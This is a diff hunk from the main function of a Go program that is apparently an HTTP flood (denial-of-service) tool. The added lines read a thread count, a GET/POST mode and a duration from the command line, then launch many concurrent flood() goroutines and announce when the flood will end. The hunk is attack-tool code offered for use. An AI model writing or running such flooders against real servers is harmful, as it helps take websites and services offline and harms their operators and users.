@@ -249,7 +249,28 @@ func main() {
 		println("Wrong mode, Only can use \"get\" or \"post\"")
 		return
 	}
-	input := bufio.NewReader(os.Stdin)
+	mode = os.Args[3]
+	threads, err := strconv.Atoi(os.Args[2])
+	if err != nil {
+		fmt.Println("Threads should be a integer")
+	}
+	limit, err := strconv.Atoi(os.Args[4])
+	if err != nil {
+		fmt.Println("limit should be a integer")
+	}
+	if contain(page, "?") == 0 {
+		key = "?"
+	} else {
+		key = "&"
+	}
+
+	for i := 0; i < threads; i++ {
+		time.Sleep(time.Microsecond * 100)
+		go flood() // Start threads
+		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
+		os.Stdout.Sync()
+		//time.Sleep( time.Millisecond * 1)
+	}
 	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
 	close(start)
 	time.Sleep(time.Duration(limit) * time.Second)
